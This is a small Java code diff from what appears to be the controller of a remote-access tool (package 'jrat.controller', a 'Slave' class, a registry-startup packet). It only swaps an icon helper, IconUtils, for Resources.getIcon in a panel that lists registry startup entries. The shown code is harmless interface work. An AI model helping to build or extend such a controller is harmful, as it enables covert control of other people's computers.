@@ -1,6 +1,6 @@
 package jrat.controller.ui.panels;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet78RegistryStartup;
 import jrat.controller.ui.DefaultJTable;
@@ -19,7 +19,7 @@ public class PanelControlRegStart extends PanelControlParent {
 	private JTable table;
 	private TableModel model;
 
-	public static final ImageIcon ICON = IconUtils.getIcon("registry-string");
+	public static final ImageIcon ICON = Resources.getIcon("registry-string");
 
 	public TableModel getModel() {
 		return model;
@@ -32,7 +32,7 @@ public class PanelControlRegStart extends PanelControlParent {
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 
 		JButton btnReloadList = new JButton("Reload list");
-		btnReloadList.setIcon(IconUtils.getIcon("update"));
+		btnReloadList.setIcon(Resources.getIcon("update"));
 		btnReloadList.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				clear();
@@ -46,7 +46,7 @@ public class PanelControlRegStart extends PanelControlParent {
 				clear();
 			}
 		});
-		btnClear.setIcon(IconUtils.getIcon("clear"));
+		btnClear.setIcon(Resources.getIcon("clear"));
 
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(
